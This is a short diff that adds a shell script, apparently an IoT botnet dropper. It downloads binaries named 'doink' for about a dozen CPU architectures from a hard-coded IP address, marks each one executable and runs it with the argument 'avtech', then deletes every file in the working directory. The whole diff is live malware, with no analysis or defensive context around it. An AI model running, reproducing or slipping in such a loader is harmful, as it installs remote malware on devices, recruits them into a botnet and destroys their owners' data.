@@ -1,0 +1,13 @@
+#!/bin/sh
+
+WEBSERVER="104.168.211.238:80"
+
+BINARIES="doink.mips doink.mipsel doink.x86 doink.arm doink.arm4 doink.arm6 doink.arm7 doink.ppc doink.spc doink.m68k doink.sh4"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O nans
+    chmod 777 nans
+    ./nans avtech
+done
+
+rm -f *
